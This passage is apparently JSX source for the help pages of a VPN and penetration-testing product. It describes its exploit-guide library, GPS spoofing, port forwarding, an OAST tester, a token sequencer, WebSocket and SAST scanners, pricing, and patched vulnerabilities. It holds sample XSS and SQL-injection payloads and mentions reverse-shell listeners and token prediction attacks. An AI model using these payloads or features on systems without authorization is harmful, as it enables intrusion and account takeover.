          <div>• Executive summary table (finding count by severity)</div>
          <div>• Per-finding section with full evidence, CVE IDs, impact rating</div>
          <div>• Complete exploitation guide (all tools, prerequisites, step-by-step commands)</div>
          <div>• How-to-verify section for each vulnerability</div>
          <div>• Full remediation with corrected code examples</div>
          <div>• Reference links (PortSwigger, OWASP, NVD) for further reading</div>
        </div>
        <Note type="info">The parser strips HTML tags from Burp/Nessus HTML exports automatically. Nessus XML (.nessus) plugin IDs are cross-referenced to CVE IDs and the NVD severity scale.</Note>
        <Note type="warn">All exploit guides and PoC code are for authorized security testing only. Only test against systems you own or have explicit written permission to test.</Note>
      </div>
    ),
  },
  {
    id: "vulnguides", title: "Vulnerability Instruction Library", icon: BookOpen,
    content: (
      <div className="space-y-3">
        <p>The <strong>Vulnerability Instruction Library</strong> is built into the Exploit Importer and provides complete educational exploitation guides for 24 vulnerability types. Each guide covers the full attack lifecycle — from tool setup through exploitation to remediation — with copy-ready commands for every step.</p>
        <h4 className="font-bold text-primary text-[11px]">What Each Guide Contains</h4>
        <div className="space-y-2">
          {[
            { t: "Impact Assessment", d: "What the vulnerability enables an attacker to do — data exfiltration, authentication bypass, full RCE, lateral movement, or service disruption." },
            { t: "Real-World Examples", d: "Named historical incidents and bug bounty reports referencing this vulnerability class (e.g., Log4Shell RCE, Coinbase CORS misconfiguration, Facebook IDOR)." },
            { t: "Tools Required", d: "Every tool needed to exploit the vulnerability, with exact install commands for all major operating systems (apt, brew, pip, gem, go install). You never have to guess what to install." },
            { t: "Before You Start", d: "Prerequisites and access requirements you need before beginning — what to confirm, what permissions you need, what recon must be done first." },
            { t: "Step-by-Step Walkthrough", d: "Numbered attack steps, each with a description AND a ready-to-run command (curl, sqlmap, python3, metasploit, nuclei, etc.). Commands work directly in a terminal against your target." },
            { t: "How to Verify", d: "Exactly how to confirm the vulnerability is successfully exploited — what output to look for, what HTTP response to expect, what server behavior confirms the attack worked." },
            { t: "How to Fix", d: "Remediation steps with corrected code examples in the relevant language (Node.js, Python, Java, PHP). Shows the vulnerable pattern and the safe replacement side-by-side." },
            { t: "Further Reading", d: "Reference links to PortSwigger Web Security Academy, OWASP Testing Guide, NVD CVE database, and tool documentation for deeper research." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">All 24 Covered Vulnerability Types</h4>
        <div className="grid grid-cols-2 gap-1.5">
          {[
            "SQL Injection (blind, UNION, boolean, auth-bypass, OOB)",
            "Cross-Site Scripting — XSS (reflected, stored, DOM, cookie theft)",
            "Remote Code Execution — RCE (bash/python reverse shells, curl exfil)",
            "Local File Inclusion — LFI (directory traversal, log poisoning)",
            "Server-Side Request Forgery — SSRF (internal services, cloud IMDS)",
            "XML External Entity — XXE (file read, SSRF chaining, OOB)",
            "Insecure Direct Object Reference — IDOR (ID enumeration, mass exfil)",
            "Cross-Site Request Forgery — CSRF (SameSite bypass, token theft)",
            "JWT Vulnerabilities (alg:none, HMAC confusion, kid injection, secret crack)",
            "Deserialization (Java ysoserial, PHP unserialize, Python pickle RCE)",
            "Server-Side Template Injection — SSTI (Jinja2, Twig, FreeMarker, ERB RCE)",
            "CORS Wildcard Misconfiguration (origin reflection, credential theft)",
            "Authentication Bypass (SQLi login, JWT forgery, parameter tampering)",
            "Environment File Exposure (.env/.git exfiltration)",
            "Git Repository Exposure (git-dumper, history extraction)",
            "Missing Security Headers (CSP, HSTS, X-Frame-Options, CORS audit)",
            "No Rate Limiting (brute-force, OTP/password enumeration)",
            "Hardcoded Secrets (grep patterns, trufflehog, gitleaks)",
            "Buffer Overflow (pwntools, ret2libc, stack smashing)",
            "Mass Assignment (over-posting undocumented fields, privilege escalation)",
            "Weak TLS (testssl.sh, sslscan, cipher downgrade, certificate issues)",
            "Spring Boot Actuator Exposure (/env, /heapdump, /actuator/env RCE)",
            "Open Redirect (parameter hijacking, phishing chaining, OAuth abuse)",
            "Default Credentials (hydra wordlists, known vendor defaults)",
            "GraphQL Security (introspection, IDOR, nested query DoS, depth limiting)",
            "CVE-Based Exploits (Nuclei templates, Metasploit modules, PoC verification)",
          ].map(v => (
            <div key={v} className="text-[9px] font-mono text-primary/83 border border-primary/8 rounded px-2 py-1">• {v}</div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Access a Guide</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>Exploit Importer</strong> (<code>/exploit-import</code>).</li>
          <li><span className="text-primary/30">2.</span> Upload or paste any scanner report containing vulnerability findings.</li>
          <li><span className="text-primary/30">3.</span> Click any finding card to expand it.</li>
          <li><span className="text-primary/30">4.</span> Click the green <strong>Instructions</strong> tab — the complete guide for that vulnerability type loads inline.</li>
          <li><span className="text-primary/30">5.</span> Scroll through Impact → Tools → Prerequisites → Steps → Verify → Fix → References.</li>
          <li><span className="text-primary/30">6.</span> To export everything: click <strong>Download Full Report</strong> at the top to get a <code>.md</code> file covering all findings.</li>
        </ol>
        <Note type="info">The instruction library is available offline in the downloaded report — the .md file includes all guides for every finding detected in your upload, formatted for sharing with clients or teams.</Note>
      </div>
    ),
  },
  {
    id: "gps-spoof", title: "GPS Spoofing", icon: MapPin,
    content: (
      <div className="space-y-3">
        <p>GPS Spoofing lets you override your device's reported GPS coordinates at the VPN tunnel level. Every app reading location data will see the spoofed position instead of your real one.</p>
        <Note type="warn">GPS Spoofing is for privacy protection and authorized testing only. Do not use it to circumvent location-locked legal agreements or cheat in location-based games on platforms where that violates their terms of service.</Note>
        <h4 className="font-bold text-primary text-[11px]">Use Cases</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Streaming geo-blocks</strong>: Access region-locked content libraries by spoofing to that country.</div>
          <div>• <strong>Location-based access control testing</strong>: Validate that your app enforces geo-restrictions correctly.</div>
          <div>• <strong>Privacy</strong>: Prevent apps from tracking your real physical location over time.</div>
          <div>• <strong>QA / testing</strong>: Simulate users in different regions without traveling.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>GPS Spoofing</strong> (<code>/gps-spoof</code>).</li>
          <li><span className="text-primary/30">2.</span> Search for a city/country or enter exact latitude and longitude coordinates.</li>
          <li><span className="text-primary/30">3.</span> Set the accuracy radius in meters (10–100m is realistic; &lt;5m may trigger anti-cheat flags).</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Apply Location Override</strong>.</li>
          <li><span className="text-primary/30">5.</span> All browser-based location reads now return the spoofed position.</li>
          <li><span className="text-primary/30">6.</span> Click <strong>Reset to Real Location</strong> when done.</li>
        </ol>
        <Note type="info">For mobile app GPS spoofing, enable developer mode on your device and install the ProxhqVPN mobile app. The app injects the mock location at the OS level, affecting all apps.</Note>
      </div>
    ),
  },
  {
    id: "port-forward", title: "Port Forwarding", icon: Network,
    content: (
      <div className="space-y-3">
        <p>Port Forwarding exposes services running on your local machine through the ProxhqVPN tunnel. Anyone with your VPN exit IP can reach the specified port, without your real IP being revealed.</p>
        <h4 className="font-bold text-primary text-[11px]">Use Cases</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• Host a game server, web server, or dev environment reachable from anywhere.</div>
          <div>• Remote access to home lab equipment using a stable VPN IP instead of dynamic ISP IP.</div>
          <div>• Penetration testing: expose listener ports for reverse shells (with VPN-level anonymity).</div>
          <div>• Team collaboration: share a local dev server with colleagues over the tunnel.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Configure</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>Port Forwarding</strong> (<code>/port-forward</code>).</li>
          <li><span className="text-primary/30">2.</span> Click <strong>Add Rule</strong>.</li>
          <li><span className="text-primary/30">3.</span> Select protocol: TCP, UDP, or Both.</li>
          <li><span className="text-primary/30">4.</span> Enter your <strong>local port</strong> (on your machine) and the <strong>external port</strong> (on the VPN exit IP).</li>
          <li><span className="text-primary/30">5.</span> Optionally restrict by source IP CIDR (e.g., <code>10.0.0.0/8</code>) to limit who can connect.</li>
          <li><span className="text-primary/30">6.</span> Click <strong>Save Rule</strong> — the port mapping activates within 30 seconds.</li>
          <li><span className="text-primary/30">7.</span> Test by connecting to <code>[your-vpn-exit-ip]:[external-port]</code> from an outside machine.</li>
        </ol>
        <Note type="danger">Never expose RDP (3389), SMB (445), or database ports (3306, 5432, 27017) to 0.0.0.0/0 without source IP restrictions. These are actively scanned by attackers around the clock.</Note>
      </div>
    ),
  },
  {
    id: "dedicated-ip", title: "Dedicated Static IP", icon: Globe,
    content: (
      <div className="space-y-3">
        <p>Dedicated IP gives you a fixed, exclusive VPN exit IP address assigned only to your account. Unlike shared pool IPs, your dedicated IP never changes and is never used by other subscribers.</p>
        <h4 className="font-bold text-primary text-[11px]">Why Use a Dedicated IP?</h4>
        <div className="space-y-2">
          {[
            { t: "Clean IP Reputation", d: "Shared pool IPs can get flagged by spam or abuse from other users. Your dedicated IP maintains its own reputation." },
            { t: "Firewall Whitelisting", d: "Whitelist your single static IP in client or partner firewall rules — no more updating rules when the pool IP rotates." },
            { t: "Payment & Email Services", d: "Payment processors and email delivery services (Mailgun, SendGrid) benefit from a consistent IP with established history." },
            { t: "Session Persistence", d: "Apps that fingerprint by IP (banking apps, admin panels) won't flag you for IP changes mid-session." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Activate</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>Dedicated IP</strong> (<code>/dedicated-ip</code>).</li>
          <li><span className="text-primary/30">2.</span> Select your preferred exit region (US-East, EU-West, AP-Southeast, etc.).</li>
          <li><span className="text-primary/30">3.</span> Click <strong>Request Dedicated IP</strong>.</li>
          <li><span className="text-primary/30">4.</span> Your static IP is provisioned within 60 seconds and displayed on screen.</li>
          <li><span className="text-primary/30">5.</span> Reconnect your WireGuard tunnel — all traffic now exits via your exclusive static IP.</li>
        </ol>
        <Note type="info">Your dedicated IP is held exclusively for the duration of your active subscription. If your subscription lapses, the IP returns to the shared pool.</Note>
      </div>
    ),
  },
  {
    id: "meshnet", title: "Meshnet", icon: Cpu,
    content: (
      <div className="space-y-3">
        <p>Meshnet creates an encrypted peer-to-peer overlay network connecting all your authorized devices into a private mesh. Traffic between mesh devices never routes through external servers — it's direct device-to-device or relayed only when NAT requires it.</p>
        <h4 className="font-bold text-primary text-[11px]">Use Cases</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Secure team networks</strong>: Connect distributed team devices into a private overlay with stable mesh IPs.</div>
          <div>• <strong>Home lab access</strong>: Reach your home machines from anywhere using their fixed mesh IP.</div>
          <div>• <strong>Pentest lab</strong>: Connect Kali, target VMs, and C2 infrastructure in an isolated private mesh.</div>
          <div>• <strong>File sharing</strong>: Transfer files between personal devices without cloud storage intermediaries.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Set Up</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>Meshnet</strong> (<code>/meshnet</code>).</li>
          <li><span className="text-primary/30">2.</span> Click <strong>Enable Meshnet</strong> — your device joins the mesh with an assigned mesh IP (100.x.x.x range).</li>
          <li><span className="text-primary/30">3.</span> On each additional device, sign in to ProxhqVPN and enable Meshnet from that device's dashboard.</li>
          <li><span className="text-primary/30">4.</span> All mesh-enabled devices appear in the <strong>Connected Peers</strong> panel.</li>
          <li><span className="text-primary/30">5.</span> Reach any peer by its mesh IP — no additional VPN configuration needed.</li>
          <li><span className="text-primary/30">6.</span> To invite external collaborators, generate a <strong>Meshnet Invite Link</strong> from the panel.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Routing Modes</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Direct</strong>: P2P connection between peers (fastest — used when both devices can reach each other).</div>
          <div>• <strong>Relayed</strong>: Traffic is relayed through a ProxhqVPN node (fallback for NAT/CGNAT environments).</div>
        </div>
      </div>
    ),
  },
  {
    id: "data-broker", title: "Data Broker Opt-Out", icon: Database,
    content: (
      <div className="space-y-3">
        <p>Data brokers collect and sell your personal information — name, address, phone number, relatives, income estimates, and more. This tool automates opt-out requests to 180+ known data broker databases, reducing your public exposure and attack surface.</p>
        <h4 className="font-bold text-primary text-[11px]">What Gets Removed</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>People-search sites</strong>: Spokeo, BeenVerified, Intelius, Whitepages, PeopleFinder, FastPeopleSearch.</div>
          <div>• <strong>Marketing databases</strong>: Acxiom, Experian Consumer, LexisNexis, Oracle Data Cloud.</div>
          <div>• <strong>Background check services</strong>: Checkr, HireRight, Sterling Talent Solutions.</div>
          <div>• <strong>Business aggregators</strong>: ZoomInfo, Clearbit, Data.com.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Run an Opt-Out Sweep</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>Data Broker Opt-Out</strong> (<code>/data-broker</code>).</li>
          <li><span className="text-primary/30">2.</span> Enter your full name, current and past addresses, email addresses, and phone numbers to remove.</li>
          <li><span className="text-primary/30">3.</span> Click <strong>Run Opt-Out Sweep</strong>.</li>
          <li><span className="text-primary/30">4.</span> The tool submits removal requests to all 180+ covered brokers automatically.</li>
          <li><span className="text-primary/30">5.</span> Track each broker's status in the <strong>Request Log</strong>: Pending → Submitted → Confirmed.</li>
        </ol>
        <Note type="info">Re-run this sweep quarterly. Data brokers continuously re-aggregate information from public records, voter rolls, and social media — removal is not permanent without ongoing maintenance.</Note>
      </div>
    ),
  },
  {
    id: "oast-tester", title: "OAST Tester", icon: Crosshair,
    content: (
      <div className="space-y-3">
        <p><strong>Out-of-Band Application Security Testing.</strong> OAST Tester generates unique callback payloads that a vulnerable target application will contact, proving blind injection vulnerabilities that produce no visible output. Powered by interactsh.</p>
        <Note type="danger">OAST payloads must only be injected into systems you own or have explicit written authorization to test. Unauthorized testing violates the CFAA and Computer Misuse Act.</Note>
        <h4 className="font-bold text-primary text-[11px]">What It Detects</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Blind SSRF</strong>: Server fetches your callback URL when processing user input.</div>
          <div>• <strong>Blind XXE</strong>: XML parser resolves your DNS/HTTP callback entity.</div>
          <div>• <strong>Blind command injection</strong>: Server executes <code>curl</code> or <code>nslookup</code> to your endpoint.</div>
          <div>• <strong>Blind SQL injection (OOB)</strong>: Database resolves DNS lookups (SQL Server <code>xp_dirtree</code>, MySQL DNS UDF).</div>
          <div>• <strong>Log4Shell / JNDI injection</strong>: JNDI LDAP callback proves exploitation.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>OAST Tester</strong> (<code>/oast-tester</code>).</li>
          <li><span className="text-primary/30">2.</span> Click <strong>Generate Callback</strong> — a unique interactsh subdomain is created (e.g., <code>abc123.oast.proxhqvpn.com</code>).</li>
          <li><span className="text-primary/30">3.</span> Copy the payload for your injection point: HTTP URL, DNS nslookup, JNDI string, or SMTP address.</li>
          <li><span className="text-primary/30">4.</span> Inject the payload into the target (URL parameter, header, XML body, JSON field, etc.).</li>
          <li><span className="text-primary/30">5.</span> Watch the <strong>Live Interactions</strong> panel — any callback appears within seconds with timestamp, source IP, and raw payload.</li>
          <li><span className="text-primary/30">6.</span> A live callback confirms the vulnerability is exploitable out-of-band.</li>
        </ol>
      </div>
    ),
  },
  {
    id: "dep-scanner", title: "Dependency Scanner", icon: GitMerge,
    content: (
      <div className="space-y-3">
        <p>Dependency Scanner checks your project's package manifests against CVE databases across all major ecosystems. Results are severity-ranked (CRITICAL → HIGH → MEDIUM → LOW) with direct upgrade commands for each finding.</p>
        <h4 className="font-bold text-primary text-[11px]">Supported Package Managers</h4>
        <div className="grid grid-cols-2 gap-1.5">
          {[
            "npm / yarn / pnpm (package.json, lock files)",
            "pip / poetry (requirements.txt, pyproject.toml)",
            "Cargo (Cargo.toml, Cargo.lock)",
            "Go modules (go.mod, go.sum)",
            "Maven / Gradle (pom.xml, build.gradle)",
            "Composer (composer.json, composer.lock)",
            "RubyGems (Gemfile, Gemfile.lock)",
            "NuGet (.csproj, packages.config)",
          ].map(v => (
            <div key={v} className="text-[9px] font-mono text-primary/83 border border-primary/8 rounded px-2 py-1">• {v}</div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>Dependency Scanner</strong> (<code>/dep-scanner</code>).</li>
          <li><span className="text-primary/30">2.</span> Upload your manifest file(s) or paste the contents directly.</li>
          <li><span className="text-primary/30">3.</span> Click <strong>Scan Dependencies</strong>.</li>
          <li><span className="text-primary/30">4.</span> Results appear in 10–30 seconds, showing: package name, vulnerable version, CVE IDs + CVSS score, description, fixed version, and upgrade command.</li>
          <li><span className="text-primary/30">5.</span> Click <strong>Export Report</strong> to download findings as CSV or JSON.</li>
        </ol>
        <Note type="info">Data sources include NVD, GitHub Advisory Database, OSV (Open Source Vulnerabilities), and Snyk Vulnerability DB — cross-referenced for maximum coverage.</Note>
      </div>
    ),
  },
  {
    id: "token-seq", title: "Token Sequencer", icon: Key,
    content: (
      <div className="space-y-3">
        <p>Token Sequencer captures session tokens or other application-generated values and performs statistical entropy analysis to detect predictability weaknesses that could allow token forgery.</p>
        <h4 className="font-bold text-primary text-[11px]">What It Tests</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Randomness quality</strong>: Measures bits of entropy (OWASP recommends ≥128 bits for session tokens).</div>
          <div>• <strong>Pattern detection</strong>: Detects sequential IDs, timestamp-based tokens, and base64-encoded integers.</div>
          <div>• <strong>Character space analysis</strong>: Identifies if the token alphabet limits effective entropy.</div>
          <div>• <strong>Prediction feasibility</strong>: For weak tokens, estimates how many attempts are needed to guess a valid token.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>Token Sequencer</strong> (<code>/token-seq</code>).</li>
          <li><span className="text-primary/30">2.</span> Collect token samples from your target: session cookies, CSRF tokens, API keys, password reset tokens. Minimum 100 samples; 500+ recommended.</li>
          <li><span className="text-primary/30">3.</span> Paste the token list (one per line) and click <strong>Analyze</strong>.</li>
          <li><span className="text-primary/30">4.</span> Review the entropy estimate, pattern signature, and risk rating: <strong>SAFE / WEAK / VULNERABLE</strong>.</li>
          <li><span className="text-primary/30">5.</span> For WEAK or VULNERABLE tokens, use the <strong>Prediction Attack</strong> tab to generate candidate tokens from the observed pattern (authorized testing only).</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Interpretation Guide</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <span className="text-green-400">&gt;128 bits</span>: Safe for session tokens.</div>
          <div>• <span className="text-amber-400">64–128 bits</span>: Marginal — acceptable only for low-risk tokens.</div>
          <div>• <span className="text-red-400">&lt;64 bits</span>: High risk — predictable under targeted attack.</div>
          <div>• <span className="text-red-400">Sequential / timestamp-based</span>: Immediately vulnerable — report as CRITICAL.</div>
        </div>
      </div>
    ),
  },
  {
    id: "ws-tester", title: "WebSocket Tester", icon: Activity,
    content: (
      <div className="space-y-3">
        <p>WebSocket Tester is a full WebSocket client with intercept, replay, and fuzzing capabilities — the equivalent of Burp Suite's WebSocket tab. Test real-time applications for injection, IDOR, privilege escalation, and business logic flaws in WS frames.</p>
        <Note type="danger">Only test WebSocket endpoints on systems you own or have explicit written authorization to test.</Note>
        <h4 className="font-bold text-primary text-[11px]">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>WebSocket Tester</strong> (<code>/ws-tester</code>).</li>
          <li><span className="text-primary/30">2.</span> Enter the target WebSocket URL (<code>ws://</code> or <code>wss://</code>).</li>
          <li><span className="text-primary/30">3.</span> Add custom headers (e.g., <code>Authorization: Bearer &lt;token&gt;</code>) if required for authentication.</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Connect</strong> — connection status and handshake headers are displayed.</li>
          <li><span className="text-primary/30">5.</span> Type any payload in the message field and click <strong>Send</strong>.</li>
          <li><span className="text-primary/30">6.</span> All sent and received frames appear in the message log with timestamps and direction indicators.</li>
          <li><span className="text-primary/30">7.</span> Click any received frame and <strong>Send to Repeater</strong> to modify and replay it.</li>
          <li><span className="text-primary/30">8.</span> Use the <strong>Fuzzer</strong> tab to automatically iterate payloads from a wordlist against a selected message template.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Common Test Payloads</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>XSS in message body</strong>: <code>&lt;img src=x onerror=alert(1)&gt;</code></div>
          <div>• <strong>IDOR</strong>: Modify <code>user_id</code> fields to another user's ID in JSON payloads.</div>
          <div>• <strong>Privilege escalation</strong>: Modify <code>role</code> or <code>permission</code> fields in WS messages.</div>
          <div>• <strong>SQL injection</strong>: Inject <code>' OR 1=1 --</code> into query parameters embedded in the WS frame.</div>
        </div>
      </div>
    ),
  },
  {
    id: "sast", title: "SAST Scanner", icon: Code2,
    content: (
      <div className="space-y-3">
        <p><strong>Static Application Security Testing.</strong> SAST Scanner analyzes source code without execution, identifying security vulnerabilities by pattern-matching across 35+ vulnerability signatures in 12 supported languages.</p>
        <h4 className="font-bold text-primary text-[11px]">Supported Languages</h4>
        <div className="text-[10px] font-mono text-primary/83 border border-primary/10 rounded px-3 py-2">
          JavaScript / TypeScript, Python, Java, Go, PHP, Ruby, C/C++, C#/.NET, Rust, Bash/Shell, SQL, Dockerfile / YAML configs
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Vulnerability Categories Detected</h4>
        <div className="grid grid-cols-2 gap-1.5">
          {[
            "SQL / command / LDAP / XPath injection",
            "XSS: reflected, stored, DOM-based",
            "Hardcoded secrets, API keys, tokens",
            "Insecure crypto: MD5, SHA-1, ECB mode",
            "Path traversal / directory traversal",
            "Unsafe deserialization (pickle, PHP unserialize)",
            "SSRF: unvalidated URL inputs to HTTP clients",
            "Prototype pollution (JS recursive merge)",
            "Weak JWT: alg:none, no expiry, hardcoded secret",
            "CORS wildcard with credentials",
            "Insecure direct object reference patterns",
            "Spring Boot actuator, debug endpoint exposure",
          ].map(v => (
            <div key={v} className="text-[9px] font-mono text-primary/83 border border-primary/8 rounded px-2 py-1">• {v}</div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>SAST Scanner</strong> (<code>/sast</code>).</li>
          <li><span className="text-primary/30">2.</span> Upload a ZIP of your source code, paste a code snippet, or connect a GitHub repository (OAuth required).</li>
          <li><span className="text-primary/30">3.</span> Select languages to scan or use <strong>Auto-Detect</strong>.</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Run SAST Scan</strong> — results appear in 15–120 seconds depending on codebase size.</li>
          <li><span className="text-primary/30">5.</span> Each finding shows: file path, line number, code snippet, vulnerability class, severity (CRITICAL/HIGH/MEDIUM/LOW), CWE ID, OWASP Top 10 mapping, and remediation guidance.</li>
          <li><span className="text-primary/30">6.</span> Click <strong>Export</strong> to download findings as SARIF, JSON, or CSV.</li>
          <li><span className="text-primary/30">7.</span> Use the <strong>Fix Suggestions</strong> tab for AI-generated remediation code diffs.</li>
        </ol>
        <Note type="info">Mark false positives inline — they are excluded from future scans of the same file and line. Adjust scan sensitivity (LOW / MEDIUM / HIGH) to balance coverage versus noise for your codebase.</Note>
      </div>
    ),
  },
  {
    id: "subscription", title: "Subscription & Billing", icon: BarChart2,
    content: (
      <div className="space-y-3">
        <p>ProxhqVPN uses Stripe for subscription billing. Manage your plan from the <strong>Pricing</strong> page (<code>/pricing</code>) and your billing details from <strong>Account</strong> (<code>/account</code>). The Pricing page is publicly accessible — no login needed to compare plans.</p>
        <h4 className="font-bold text-primary text-[11px]">Plan Pricing</h4>
        <div className="space-y-2">
          {[
            { t: "VPN Basic", p: "$6.99/mo — $59.99/yr", d: "WireGuard VPN, Kill Switch, Leak Detection, DNS Shield, DNS Sinkhole, Network Traffic Monitor, Smart DNS, Split Tunneling, VPN Gate, Onion Browser, Router Config, IP Exposure Scanner, Obfuscation (Stealth Mode), Device Manager, GPS Spoofing, Port Forwarding, Dedicated Static IP, Meshnet, Data Broker Opt-Out." },
            { t: "Command Center Pro", p: "$39.99/mo — $349.99/yr", d: "Everything in Basic plus: Alpha Toolkit, SQLmap, SilkWeb Honeypot, Firewall Manager, Threat Monitor, SIEM, OSINT Recon, Canary Tokens, Ghost Chain Exploit Arsenal, Exploit Importer, Remote Terminal, Security Audit, Threat Intelligence, HTTP Probe, Directory Fuzzer, Subdomain Scout, Intruder, Encoder, CVE Lookup, Payload Generator, Request Comparer, OAST Tester, Dependency Scanner, Token Sequencer, WebSocket Tester, SAST Scanner." },
          ].map(({ t, p, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t} <span className="text-green-400 ml-1">{p}</span></div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Plan Actions</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Upgrade</strong> — click a plan tier → redirected to Stripe Checkout → payment processed securely</div>
          <div>• <strong>Downgrade</strong> — takes effect at end of current billing period</div>
          <div>• <strong>Cancel</strong> — click <strong>Manage Billing</strong> in Account → Stripe Customer Portal → Cancel subscription</div>
          <div>• <strong>Invoices</strong> — all invoices available in Account → Stripe Customer Portal</div>
          <div>• <strong>Ambassador Promo Code</strong> — enter at checkout for a 10% discount and to support your chosen ambassador</div>
        </div>
        <Note type="info">ProxhqVPN never stores your payment card details. All payment data is handled exclusively by Stripe's PCI-DSS Level 1 certified systems.</Note>
      </div>
    ),
  },
  {
    id: "security-hardening", title: "Platform Security — v2.1.0 Hardening", icon: ShieldAlert,
    content: (
      <div className="space-y-3">
        <p>ProxhqVPN v2.1.0 is the platform's most security-focused release to date. Following a comprehensive third-party security audit, six vulnerabilities were patched and three new security layers were added. This section documents what changed and what it means for your protection.</p>
        <h4 className="font-bold text-primary text-[11px]">Vulnerabilities Patched (v2.1.0)</h4>
        <div className="space-y-2">
          {[
            { sev: "CRITICAL", t: "Timing Attack on Session Secret Fixed", d: "The internal API authentication compared secrets using === (string equality), which leaks secret length via response timing. Now uses crypto.timingSafeEqual() — constant-time comparison that reveals no information about the secret regardless of response timing." },
            { sev: "CRITICAL", t: "External DB SSL MitM Vulnerability Fixed", d: "External PostgreSQL connections in the SQL Interface previously had rejectUnauthorized: false — allowing a man-in-the-middle to intercept your database traffic with a forged certificate. Now defaults to true (verified certificates only)." },
            { sev: "CRITICAL", t: "Shell Chain Injection Blocked in Terminal", d: "Allowlisted terminal commands (like curl) could be chained with ; && || backticks $() to execute arbitrary commands — even in restricted mode. A 14-pattern SHELL_CHAIN_BLOCKED regex set now catches all injection metacharacters in non-Ghost-Mode sessions." },
            { sev: "HIGH", t: "SSRF Redirect Chain Bypass Fixed", d: "The HTTP Client in the terminal validated the initial URL against the SSRF guard, but followed redirects without re-checking each hop. An open redirect to 169.254.169.254 (cloud metadata) would bypass the guard. Now validates every redirect hop individually (max 5 hops)." },
            { sev: "HIGH", t: "IP Auto-Ban System Added", d: "No brute-force protection existed for repeated authentication failures. Now: 20 failed requests from a single IP within 5 minutes triggers a 30-minute automatic block. All bans are logged with timestamp and IP." },
            { sev: "MEDIUM", t: "WAF URL-Encoding Bypass Patched", d: "The WAF only checked raw URL strings. Double-encoded payloads like %2527 (double-encoded ') bypassed all SQL injection detection. The WAF now decodes URLs twice and checks all decoded variants. 5 new attack patterns added including LFI file paths and dropper patterns." },
          ].map(({ sev, t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="flex items-center gap-2 mb-0.5">
                <span className={`text-[8px] font-mono font-bold px-1.5 py-0.5 rounded ${sev === "CRITICAL" ? "bg-red-900/40 text-red-400" : sev === "HIGH" ? "bg-orange-900/40 text-orange-400" : "bg-yellow-900/40 text-yellow-400"}`}>{sev}</span>
                <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              </div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Desktop App — v2.1.0 Certificate Pinning</h4>
